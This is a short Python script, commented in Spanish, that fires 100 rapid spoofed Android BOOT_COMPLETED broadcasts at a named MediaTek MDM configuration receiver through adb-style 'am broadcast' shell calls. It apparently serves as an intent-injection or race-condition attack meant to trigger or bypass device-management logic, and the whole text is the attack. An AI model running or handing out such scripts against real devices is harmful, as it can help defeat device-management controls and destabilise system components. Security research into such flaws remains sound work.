import time
import subprocess

# Enviar múltiples intents rápidamente
for i in range(100):
    subprocess.run(f'am broadcast -a android.intent.action.BOOT_COMPLETED \
                   -n com.mediatek.mdmconfig/.MDMReceiver', 
                   shell=True, timeout=0.5)
    time.sleep(0.01)
